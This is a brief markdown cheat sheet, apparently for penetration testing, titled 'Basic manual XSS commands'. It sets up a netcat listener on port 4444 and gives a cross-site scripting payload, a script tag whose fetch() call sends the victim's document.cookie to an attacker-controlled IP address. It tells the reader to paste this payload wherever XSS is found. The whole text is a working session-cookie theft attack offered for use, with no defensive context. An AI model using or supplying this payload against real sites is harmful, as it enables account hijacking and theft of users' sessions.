# Basic manual XSS commands
`1` cookie stealer:

```bash
# setup a netcat listener first
nc -lnvp 4444
```
then paste this payload wherever you detect XSS

```html
<script>fetch('http://192.168.143.92:4444/steal?c='+document.cookie)</script>
```
